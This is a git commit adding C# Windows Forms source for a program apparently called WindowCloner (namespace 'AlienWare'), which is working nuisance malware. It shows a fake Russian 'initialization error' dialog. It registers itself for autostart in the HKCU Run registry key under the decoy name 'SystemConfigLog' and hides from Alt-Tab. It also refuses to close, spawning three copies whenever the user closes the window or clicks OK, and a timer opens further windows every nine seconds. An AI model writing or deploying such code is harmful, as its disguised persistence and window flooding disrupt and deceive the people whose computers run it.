ee05245b171c123ea2d8c28115ab11c1b6b8f246
AdiXaK <113100045+AdiXaK@users.noreply.github.com>
2024-01-30 10:57:47 +0300

    initial

---
+++ WindowCloner/MainForm.Designer.cs
@@ -0,0 +1,106 @@
+﻿/*
+ * Создано в SharpDevelop.
+ * Пользователь: karni
+ * Дата: 04.12.2023
+ * Время: 16:00
+ * 
+ * Для изменения этого шаблона используйте меню "Инструменты | Параметры | Кодирование | Стандартные заголовки".
+ */
+namespace AlienWare
+{
+	partial class MainForm
+	{
+		/// <summary>
+		/// Designer variable used to keep track of non-visual components.
+		/// </summary>
+		private System.ComponentModel.IContainer components = null;
+		private System.Windows.Forms.PictureBox pictureBox1;
+		private System.Windows.Forms.Label label1;
+		private System.Windows.Forms.Button button1;
+		
+		/// <summary>
+		/// Disposes resources used by the form.
+		/// </summary>
+		/// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+		protected override void Dispose(bool disposing)
+		{
+			if (disposing) {
+				if (components != null) {
+					components.Dispose();
+				}
+			}
+			base.Dispose(disposing);
+		}
+		
+		/// <summary>
+		/// This method is required for Windows Forms designer support.
+		/// Do not change the method contents inside the source code editor. The Forms designer might
+		/// not be able to load this method if it was changed manually.
+		/// </summary>
+		private void InitializeComponent()
+		{
+			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(MainForm));
+			this.pictureBox1 = new System.Windows.Forms.PictureBox();
+			this.label1 = new System.Windows.Forms.Label();
+			this.button1 = new System.Windows.Forms.Button();
+			((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+			this.SuspendLayout();
+			// 
+			// pictureBox1
+			// 
+			this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
+			this.pictureBox1.Location = new System.Drawing.Point(43, 30);
+			this.pictureBox1.Name = "pictureBox1";
+			this.pictureBox1.Size = new System.Drawing.Size(37, 38);
+			this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+			this.pictureBox1.TabIndex = 0;
+			this.pictureBox1.TabStop = false;
+			this.pictureBox1.Click += new System.EventHandler(this.PictureBox1Click);
+			// 
+			// label1
+			// 
+			this.label1.Font = new System.Drawing.Font("Times New Roman", 10.2F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+			this.label1.Location = new System.Drawing.Point(86, 30);
+			this.label1.Name = "label1";
+			this.label1.Size = new System.Drawing.Size(473, 62);
+			this.label1.TabIndex = 1;
+			this.label1.Text = "﻿﻿﻿﻿﻿Не удалось загрузить сервисы.\r\nОшибка: Не удалось запустить сервис Репозитор" +
+	"ий типов \r\nдрайверов";
+			this.label1.Click += new System.EventHandler(this.Label1Click);
+			// 
+			// button1
+			// 
+			this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
+			this.button1.Font = new System.Drawing.Font("Times New Roman", 10.2F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+			this.button1.Location = new System.Drawing.Point(445, 111);
+			this.button1.Name = "button1";
+			this.button1.Size = new System.Drawing.Size(92, 29);
+			this.button1.TabIndex = 2;
+			this.button1.Text = "ОК";
+			this.button1.UseVisualStyleBackColor = true;
+			this.button1.Click += new System.EventHandler(this.Button1Click);
+			// 
+			// MainForm
+			// 
+			this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.None;
+			this.ClientSize = new System.Drawing.Size(550, 148);
+			this.Controls.Add(this.button1);
+			this.Controls.Add(this.label1);
+			this.Controls.Add(this.pictureBox1);
+			this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.Fixed3D;
+			this.ImeMode = System.Windows.Forms.ImeMode.Off;
+			this.MaximumSize = new System.Drawing.Size(572, 199);
+			this.MinimizeBox = false;
+			this.MinimumSize = new System.Drawing.Size(572, 199);
+			this.Name = "MainForm";
+			this.ShowIcon = false;
+			this.ShowInTaskbar = false;
+			this.Text = "Ошибка инициализации";
+			this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.MainFormFormClosing);
+			this.Load += new System.EventHandler(this.MainFormLoad);
+			((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+			this.ResumeLayout(false);
+
+		}
+	}
+}
---
+++ WindowCloner/MainForm.cs
@@ -0,0 +1,95 @@
+﻿using System.Collections.Generic;
+using System.Drawing;
+using System.Windows.Forms;
+using Microsoft.Win32;
+using System.Runtime.InteropServices;
+using System;   
+using System.Media;
+namespace AlienWare
+{
+	public partial class MainForm : Form
+	{
+		        private static readonly Random random = new Random();
+		private const int GWL_EXSTYLE = -20;
+		private const int WS_EX_TOOLWINDOW = 0x00000080;
+		[DllImport("user32.dll")]
+		private static extern int GetWindowLong(IntPtr hWnd, int nIndex);
+		[DllImport("user32.dll")]
+		private static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
+		public MainForm()
+		{
+			InitializeComponent();
+		}
+		void MainFormFormClosing(object sender, FormClosingEventArgs e)
+		{
+			if (e.CloseReason == CloseReason.UserClosing)
+			{
+				e.Cancel = true;
+			}
+			Hide();
+			Form clone = new  MainForm();
+			clone.Show();
+			Form clon = new  MainForm();
+			clon.Show();
+			Form re = new  MainForm();
+			re.Show();
+		}
+		void MainFormLoad(object sender, System.EventArgs e)
+		{
+			            SystemSounds.Hand.Play(); // Play the Windows error sound
+			TopMost = true;
+			HideFromAltTab(this);
+			using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+			{
+				key.SetValue("SystemConfigLog", Application.ExecutablePath);
+			}
+			int exStyle = GetWindowLong(this.Handle, GWL_EXSTYLE);
+			SetWindowLong(this.Handle, GWL_EXSTYLE, exStyle | WS_EX_TOOLWINDOW);
+			            Timer timer = new Timer();
+            timer.Interval = 9000; //  seconds
+            timer.Tick += TimerTick;
+            timer.Start();
+		}
+		private static void HideFromAltTab(Form form)
+		{
+			int exStyle = GetWindowLong(form.Handle, GWL_EXSTYLE);
+			exStyle |= WS_EX_TOOLWINDOW;
+			SetWindowLong(form.Handle, GWL_EXSTYLE, exStyle);
+		}
+		void Label1Click(object sender, EventArgs e)
+		{
+			
+		}
+		void PictureBox1Click(object sender, EventArgs e)
+		{
+			
+		}
+		void Button1Click(object sender, EventArgs e)
+		{
+			Hide();
+			Form clone = new  MainForm();
+			clone.Show();
+			Form clon = new  MainForm();
+			clon.Show();
+			clon.Location = GetRandomPosition();
+			Form re = new  MainForm();
+			re.Show();
+			re.Location = GetRandomPosition();
+		}
+		        private void TimerTick(object sender, EventArgs e)
+        {
+            Form newForm = new MainForm();
+            newForm.StartPosition = FormStartPosition.Manual;
+            newForm.Location = GetRandomPosition();
+            newForm.Show();
+        }
+
+        private Point GetRandomPosition()
+        {
+            Screen screen = Screen.PrimaryScreen;
+            int x = random.Next(screen.Bounds.Width - Width);
+            int y = random.Next(screen.Bounds.Height - Height);
+            return new Point(x, y);
+        }
+	} 
+}
